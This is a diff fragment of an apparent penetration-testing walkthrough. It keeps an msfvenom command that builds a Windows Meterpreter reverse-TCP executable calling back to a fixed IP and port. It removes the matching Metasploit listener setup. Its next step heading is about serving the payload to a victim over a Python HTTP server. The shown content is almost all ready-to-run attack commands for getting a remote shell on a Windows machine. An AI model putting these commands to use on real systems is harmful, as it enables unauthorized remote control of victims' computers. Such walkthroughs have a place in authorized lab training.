@@ -38,16 +38,6 @@ On Kali Linux, open a terminal and generate a malicious executable:
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f exe > /tmp/payload.exe
 ```
-Now, set up a listener in Metasploit:
-```bash
-msfconsole
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.131
-set LPORT 4444
-exploit
-```
-This will start a reverse shell listener waiting for the victim to execute the malicious file.
 #### Step 3: Send Payload through Python HTTP Server
 ```bash
 cd /tmp
